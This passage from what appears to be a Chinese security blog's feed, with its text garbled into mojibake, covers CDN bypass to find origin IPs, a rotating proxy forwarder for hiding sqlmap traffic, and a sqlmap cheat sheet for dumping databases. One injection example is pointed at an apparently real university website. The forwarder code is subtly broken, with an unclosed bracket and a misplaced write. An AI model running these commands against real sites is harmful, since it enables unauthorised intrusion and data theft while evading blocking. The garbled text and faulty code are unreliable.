id="ä¸ƒã€å…¨ç½‘æ‰«æ">ä¸ƒã€å…¨ç½‘æ‰«æ</h2><p>é€šè¿‡Zmapã€masscanç­‰å·¥å…·å¯¹æ•´ä¸ªäº’è”ç½‘å‘èµ·æ‰«æï¼Œé’ˆå¯¹æ‰«æç»“æœè¿›è¡Œå…³é”®å­—æŸ¥æ‰¾ï¼Œè·å–ç½‘ç«™çœŸå®IPã€‚</p><ol><li>ZMapå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘æ‰«æå·¥å…·ï¼Œèƒ½å¤Ÿåœ¨45åˆ†é’Ÿæ‰«éå…¨ç½‘ã€‚</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure><ol start="2"><li>Masscanå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘ç«¯å£æ‰«æå™¨ï¼Œæœ€å¿«å¯ä»¥åœ¨å…­åˆ†é’Ÿå†…æ‰«éäº’è”ç½‘ã€‚</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure><h2 id="å…«ã€é…ç½®ä¸å½“å¯¼è‡´ç»•è¿‡">å…«ã€é…ç½®ä¸å½“å¯¼è‡´ç»•è¿‡</h2><p>åœ¨é…ç½®CDNçš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®šåŸŸåã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œæœ‰æ—¶å€™å°å°çš„é…ç½®ç»†èŠ‚å°±å®¹æ˜“å¯¼è‡´CDNé˜²æŠ¤è¢«ç»•è¿‡ã€‚</p><ul><li>æ¡ˆä¾‹1ï¼šä¸ºäº†æ–¹ä¾¿ç”¨æˆ·è®¿é—®ï¼Œ<a href="http://xn--www-ot9d021dl8ca199e.test.com" target="_blank" rel="noopener">æˆ‘ä»¬å¸¸å¸¸å°†www.test.com</a> å’Œ <a href="http://test.com" target="_blank" rel="noopener">test.com</a> è§£æåˆ°åŒä¸€ä¸ªç«™ç‚¹ï¼Œ<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com" target="_blank" rel="noopener">è€ŒCDNåªé…ç½®äº†www.test.com</a>ï¼Œ<a href="http://xn--test-pr9lp7quqa868a.com" target="_blank" rel="noopener">é€šè¿‡è®¿é—®test.com</a>ï¼Œå°±å¯ä»¥ç»•è¿‡ CDN äº†ã€‚</li><li>æ¡ˆä¾‹2ï¼šç«™ç‚¹åŒæ—¶æ”¯æŒhttpå’Œhttpsè®¿é—®ï¼ŒCDNåªé…ç½® httpsåè®®ï¼Œé‚£ä¹ˆè¿™æ—¶è®¿é—®httpå°±å¯ä»¥è½»æ˜“ç»•è¿‡ã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;ç›®å‰å¾ˆå¤šç«™ç‚¹å‡ºäºç”¨æˆ·ä½“éªŒå’Œå®‰å…¨çš„è§’åº¦ï¼Œä½¿ç”¨CDNåŠ é€Ÿï¼Œå°†åŸŸåè§£æåˆ°CDNï¼Œè¿™æ—¶å€™å°±éœ€è¦ç»•è¿‡CDNæ¥æŸ¥æ‰¾çœŸå®IPã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;ä¸€ã€DNSå†å²è§£æè®°å½•&quot;&gt;ä¸€ã€DNSå†å²è§£æè®°å½•&lt;/h2&gt;
&lt;p&gt;æŸ¥è¯¢åŸŸåçš„å†å²è§£
      
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="æŠ€å·§" scheme="http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>SqlMapä»£ç†æ± </title>
    <link href="http://yoursite.com/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/"/>
    <id>http://yoursite.com/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/</id>
    <published>2020-06-22T07:16:21.000Z</published>
    <updated>2020-06-22T07:23:05.708Z</updated>
    
    <content type="html"><![CDATA[<h2 id="è·å–ä»£ç†æ± ">è·å–ä»£ç†æ± </h2><p>è·å–ä»£ç†æ± ä½¿ç”¨äº†GIthubä¸Šçš„é¡¹ç›®ï¼š<a href="https://github.com/jhao104/proxy_pool" target="_blank" rel="noopener">https://github.com/jhao104/proxy_pool</a> ï¼Œå¹¶åˆ©ç”¨REDISå­˜å‚¨è·å–åˆ°çš„ä»£ç†åœ°å€</p><h3 id="å¯åŠ¨é¡¹ç›®">å¯åŠ¨é¡¹ç›®</h3><p>åœ¨<code>cli</code>ç›®å½•ä¸‹é€šè¿‡<code>ProxyPool.py</code>å¯åŠ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># é¦–å…ˆå¯åŠ¨è°ƒåº¦ç¨‹åº</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py schedule</span><br><span class="line"></span><br><span class="line"># ç„¶åå¯åŠ¨webApiæœåŠ¡</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py webserver</span><br></pre></td></tr></table></figure><h3 id="Api">Api</h3><p>å¯åŠ¨è¿‡å‡ åˆ†é’Ÿåå°±èƒ½çœ‹åˆ°æŠ“å–åˆ°çš„ä»£ç†IPï¼Œå¯ä»¥ç›´æ¥åˆ°æ•°æ®åº“ä¸­æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡apiè®¿é—®http://127.0.0.1:5010 æŸ¥çœ‹ã€‚</p><table><thead><tr><th>api</th><th>method</th><th>Description</th><th>arg</th></tr></thead><tbody><tr><td>/</td><td>GET</td><td>apiä»‹ç»</td><td>None</td></tr><tr><td>/get</td><td>GET</td><td>éšæœºè·å–ä¸€ä¸ªä»£ç†</td><td>None</td></tr><tr><td>/get_all</td><td>GET</td><td>è·å–æ‰€æœ‰ä»£ç†</td><td>None</td></tr><tr><td>/get_status</td><td>GET</td><td>æŸ¥çœ‹ä»£ç†æ•°é‡</td><td>None</td></tr><tr><td>/delete</td><td>GET</td><td>åˆ é™¤ä»£ç†</td><td>proxy=host:ip</td></tr></tbody></table><h3 id="ä¿å­˜ä»£ç†">ä¿å­˜ä»£ç†</h3><p>è‡ªå·±ç¼–å†™äº†ä¸ªå°è„šæœ¬å°†<code>ProxyPool.py</code>è·å–åˆ°çš„ä»£ç†ä¿å­˜åœ¨<code>ips.txt</code>ä¸­<br><strong>get_proxy.py</strong>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_proxy():</span><br><span class="line">    return requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_all&#x2F;&quot;).json()</span><br><span class="line"></span><br><span class="line">def delete_proxy(proxy):</span><br><span class="line">    requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;delete&#x2F;?proxy&#x3D;&#123;&#125;&quot;.format(proxy))</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_status&quot;).json()</span><br><span class="line">count &#x3D; res.get(&quot;useful_proxy&quot;)</span><br><span class="line">print(&quot;ç›®å‰ä»£ç†æ± ä¸­å…±è®¡ï¼š%sä¸ªä»£ç†.&quot; % count)</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;ips.txt&quot;, &quot;w&quot;)</span><br><span class="line">for i in range(count):</span><br><span class="line">    b &#x3D; get_proxy()[i][&quot;proxy&quot;]</span><br><span class="line">f.write(b + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h2 id="æœ¬åœ°ä»£ç†è½¬å‘">æœ¬åœ°ä»£ç†è½¬å‘</h2><p>å€Ÿç”¨å‰äººçš„æˆæœï¼Œå®ç°çš„æ•ˆæœæ˜¯å¯ç”¨æœ¬åœ°<code>127.0.0.1:9999</code>æœåŠ¡ï¼Œå°†<code>ips.txt</code>å†…çš„ä»£ç†è½¬å‘ç»™æœ¬åœ°å®¢æˆ·ç«¯<br><strong><a href="http://ips.py" target="_blank" rel="noopener">ips.py</a></strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">localtime = time.asctime(time.localtime(time.time()))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyServerTest</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, proxyip)</span>:</span></span><br><span class="line">        <span class="comment"># æœ¬åœ°socketæœåŠ¡</span></span><br><span class="line">        self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.proxyip = proxyip</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># æœ¬åœ°æœåŠ¡IPå’Œç«¯å£</span></span><br><span class="line">            self.ser.bind((<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br><span class="line">            <span class="comment"># æœ€å¤§è¿æ¥æ•°</span></span><br><span class="line">            self.ser.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">"[-]The local service : "</span> + str(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"[-]The local service : "</span> + str(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># æ¥æ”¶å®¢æˆ·ç«¯æ•°æ®</span></span><br><span class="line">                client, addr = self.ser.accept()</span><br><span class="line">                print(<span class="string">'[*]accept %s connect'</span> % (addr,))</span><br><span class="line">                data = client.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                print(<span class="string">'[*'</span> + localtime + <span class="string">']: Accept data...'</span>)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">"[-]Local receiving client : "</span> + str(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[-]Local receiving client : "</span> + str(e)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># ç›®æ ‡ä»£ç†æœåŠ¡å™¨ï¼Œå°†å®¢æˆ·ç«¯æ¥æ”¶æ•°æ®è½¬å‘ç»™ä»£ç†æœåŠ¡å™¨</span></span><br><span class="line">                mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                iplen = len(self.proxyip)</span><br><span class="line">                proxyip = self.proxyip[random.randint(<span class="number">0</span>, iplen - <span class="number">1</span>)]</span><br><span class="line">                print(<span class="string">"[!]Now proxy ip:"</span> + str(proxyip))</span><br><span class="line">                prip = proxyip[<span class="number">0</span>]</span><br><span class="line">                prpo = proxyip[<span class="number">1</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    mbsocket.settimeout(<span class="number">3</span>)</span><br><span class="line">                    mbsocket.connect((prip, prpo))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">"[-]RE_Connect..."</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#                   except :</span></span><br><span class="line">            <span class="comment">#                       print("[-]Connect failed,change proxy ip now...")</span></span><br><span class="line">            <span class="comment">#                      pass</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                mbsocket.send(data)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">"[-]Sent to the proxy server : "</span> + str(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[-]Sent to the proxy server : "</span> + str(e)</span><br><span class="line">                               </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># ä»ä»£ç†æœåŠ¡å™¨æ¥æ”¶æ•°æ®ï¼Œç„¶åè½¬å‘å›å®¢æˆ·ç«¯</span></span><br><span class="line">                    data_1 = mbsocket.recv(<span class="number">1024</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> data_1:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    print(<span class="string">'[*'</span> + localtime + <span class="string">']: Send data...'</span>)</span><br><span class="line">                    client.send(data_1)</span><br><span class="line">                <span class="keyword">except</span> socket.timeout <span class="keyword">as</span> e:</span><br><span class="line">                    print(proxyip)</span><br><span class="line">                    print(<span class="string">"[-]Back to the client : "</span> + str(e))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># å…³é—­è¿æ¥</span></span><br><span class="line"></span><br><span class="line">            client.close()</span><br><span class="line">            mbsocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Loadips</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[*]Loading proxy ips.."</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    ip = [<span class="string">'ip'</span>, <span class="string">'port'</span>]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"ips.txt"</span>) <span class="keyword">as</span> ips:</span><br><span class="line">        lines = ips.readlines()</span><br><span class="line">                               </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        ip[<span class="number">0</span>], ip[<span class="number">1</span>] = line.strip().split(<span class="string">":"</span>)</span><br><span class="line">        ip[<span class="number">1</span>] = eval(ip[<span class="number">1</span>])</span><br><span class="line">        nip = tuple(ip)</span><br><span class="line">        ip_list.append(nip)</span><br><span class="line">    <span class="keyword">return</span> ip_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'''*Atuhor : V@1n3R.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Blog :http://www.Lz1y.cn</span></span><br><span class="line"><span class="string">*date: 2017.7.17</span></span><br><span class="line"><span class="string">*http://www.Lz1y.cn/wordpress/?p=643</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         __     __    _       _____ ____    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         \ \   / /_ _/ |_ __ |___ /|  _ \   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          \ \ / / _` | | '_ \  |_ \| |_) |  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                           \ V / (_| | | | | |___) |  _ &lt; _ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            \_/ \__,_|_|_| |_|____/|_| \_(_) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"></span><br><span class="line">    ip_list = Loadips()</span><br><span class="line">    <span class="comment">#   ip_list = [('118.89.148.92',8088)]</span></span><br><span class="line">    <span class="comment">#   ip_list = tuple(ip_list)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pst = ProxyServerTest(ip_list)</span><br><span class="line">        <span class="comment"># å¤šçº¿ç¨‹</span></span><br><span class="line">        t = threading.Thread(target=pst.run, name=<span class="string">'LoopThread'</span>)</span><br><span class="line">        print(<span class="string">'[*]Waiting for connection...'</span>)</span><br><span class="line">        <span class="comment"># å…³é—­å¤šçº¿ç¨‹</span></span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"[-]main : "</span> + str(e))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"[-]main : "</span> + str(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="SqlMapä½¿ç”¨ä»£ç†æ± ">SqlMapä½¿ç”¨ä»£ç†æ± </h2><blockquote><p>sqlmapåŠ ä¸Šä»£ç† â€œâ€“proxy=http://127.0.0.1:9999â€ å³å¯ä½¿ç”¨</p><p>ä½¿ç”¨ä¹‹å‰å»ºè®®å…ˆæ£€æµ‹ä¸€ä¸‹ä»£ç†çš„æœ‰æ•ˆæ€§ï¼š<a href="http://h.jiguangdaili.com/check/" target="_blank" rel="noopener">http://h.jiguangdaili.com/check/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;è·å–ä»£ç†æ± &quot;&gt;è·å–ä»£ç†æ± &lt;/h2&gt;
&lt;p&gt;è·å–ä»£ç†æ± ä½¿ç”¨äº†GIthubä¸Šçš„é¡¹ç›®ï¼š&lt;a href=&quot;https://github.com/jhao104/proxy_pool&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://githu
      
    
    </summary>
    
    
      <category term="å·¥å…·" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Sqlmap" scheme="http://yoursite.com/tags/Sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>SqlMapæ€»ç»“</title>
    <link href="http://yoursite.com/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/</id>
    <published>2020-06-22T03:29:58.000Z</published>
    <updated>2020-06-22T05:41:42.962Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SqlMapæµ‹è¯•åŸºæœ¬æµç¨‹">SqlMapæµ‹è¯•åŸºæœ¬æµç¨‹</h2><blockquote><p>sqlmap -u â€œurlâ€<br>sqlmap -u URL â€“dbs<br>sqlmap -u URL -D database â€“tables<br>sqlmap -u URL -D database -T tablename â€“columns<br>sqlmap -u URL -D database -T tablename -C columnsname â€“dump</p></blockquote><h2 id="SqlMapå¸¸ç”¨å‘½ä»¤">SqlMapå¸¸ç”¨å‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">--is-dba å½“å‰ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ä¸ºrootæƒé™ï¼Œmssqlä¸‹æœ€é«˜æƒé™ä¸ºsaï¼‰</span><br><span class="line">-â€“batch é»˜è®¤é€‰é¡¹è¿è¡Œ</span><br><span class="line">--dbs æ‰€æœ‰æ•°æ®åº“</span><br><span class="line">--current-db ç½‘ç«™å½“å‰æ•°æ®åº“</span><br><span class="line">--users æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·</span><br><span class="line">--current-user å½“å‰æ•°æ®åº“ç”¨æˆ·</span><br><span class="line">--random-agent æ„é€ éšæœºuser-agent</span><br><span class="line">â€“dbms æŒ‡å®šåç«¯æ•°æ®åº“,ç»™å®šåç«¯æ•°æ®åº“çš„ç±»å‹å¯ä»¥å‡å°‘å‡å°‘æ— å…³çš„æµ‹è¯•ç”¨ä¾‹</span><br><span class="line">--proxy http:&#x2F;&#x2F;local:8080 â€“threads 10 (å¯ä»¥è‡ªå®šä¹‰çº¿ç¨‹åŠ é€Ÿ) ä»£ç†</span><br><span class="line">--time-sec&#x3D;TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’</span><br><span class="line">--threads&#x3D;                       ä½¿ç”¨å¤šå°‘çº¿ç¨‹</span><br><span class="line">â€“fresh-queries fresh-queriesä¼šå¿½ç•¥ä¹‹å‰çš„æŸ¥è¯¢ç»“æœ,è¿›è¡Œé‡æ–°è¯·æ±‚æ“ä½œ</span><br><span class="line">â€“flush-session flush-sessionä¼šæ¸…ç©ºå½“å‰URLç›¸å…³çš„session</span><br><span class="line">â€“level è®¾ç½®æ£€æµ‹çš„æ–¹æ–¹é¢é¢å’Œæµ‹è¯•ç”¨ä¾‹</span><br><span class="line">    - é»˜è®¤æ˜¯1,ä¼šå°è¯•POSTå’ŒGET</span><br><span class="line">    - 2:Cookieä¹Ÿä¼šåŠ å…¥æ£€æµ‹</span><br><span class="line">    - 3:User-Agentå’ŒRefererä¹Ÿä¼šæ£€æµ‹, æ›´å¤§çš„å€¼ä¼šå¢åŠ ç”¨ä¾‹é‡</span><br><span class="line">-â€“technique æŒ‡å®šsqlmapä½¿ç”¨çš„æ£€æµ‹æŠ€æœ¯</span><br><span class="line">    B:Boolean-based-blind ï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</span><br><span class="line">    U:Union query-based ï¼ˆè”åˆæ³¨å…¥ï¼‰</span><br><span class="line">    E:Error-based ï¼ˆæŠ¥é”™å‹æ³¨å…¥)</span><br><span class="line">    S:Starked queries ï¼ˆé€šè¿‡sqlmapè¯»å–æ–‡ä»¶ç³»ç»Ÿã€æ“ä½œç³»ç»Ÿã€æ³¨å†Œè¡¨å¿…é¡» ä½¿ç”¨è¯¥å‚æ•°ï¼Œå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰</span><br><span class="line">    T:Time-based blind ï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</span><br></pre></td></tr></table></figure><h2 id="MYSQLæ–°ç‰¹æ€§secure-file-privå¯¹è¯»å†™æ–‡ä»¶çš„å½±å“">MYSQLæ–°ç‰¹æ€§secure_file_privå¯¹è¯»å†™æ–‡ä»¶çš„å½±å“</h2><p>secure-file-privæ˜¯åœ¨Mysql5.7ç‰ˆæœ¬åå¼•å…¥çš„æ–°ç‰¹æ€§ï¼Œsecure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶å¯¼å…¥å¯¼å‡ºä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•</p><ul><li>å½“é…ç½®æ–‡ä»¶å†…æ²¡æœ‰secure-file-privå‚æ•°ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</li><li>å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</li><li>å½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹</li></ul><p>è§£å†³æ–¹æ³•ï¼š<br>windowsä¸‹ï¼šä¿®æ”¹my.ini åœ¨[mysqld]å†…åŠ å…¥secure_file_priv =<br>linuxä¸‹ï¼šä¿®æ”¹my.cnf åœ¨[mysqld]å†…åŠ å…¥secure_file_priv =<br>ä¹‹åéœ€é‡å¯Mysql</p><h2 id="SqlMapæŠ€å·§">SqlMapæŠ€å·§</h2><h3 id="æŠ“åŒ…æ³¨å…¥">æŠ“åŒ…æ³¨å…¥</h3><p>ä»bpæŠ“åŒ…æ–‡ä»¶ä¸­æ£€æµ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;è·¯å¾„&quot;</span><br></pre></td></tr></table></figure><h3 id="æŒ‡å®šæ£€æµ‹å‚æ•°">æŒ‡å®šæ£€æµ‹å‚æ•°</h3><ul><li>-p å‚æ•°å</li><li>å‚æ•°åé¢åŠ ä¸Š<code>*</code>d</li></ul><h3 id="ä¼ªé™æ€æ³¨å…¥">ä¼ªé™æ€æ³¨å…¥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sqlmap.py -u â€œhttp:&#x2F;&#x2F;sfl.fzu.edu.cn&#x2F;index.php&#x2F;Index&#x2F;view&#x2F;id&#x2F;40*.html&quot;</span><br></pre></td></tr></table></figure><h3 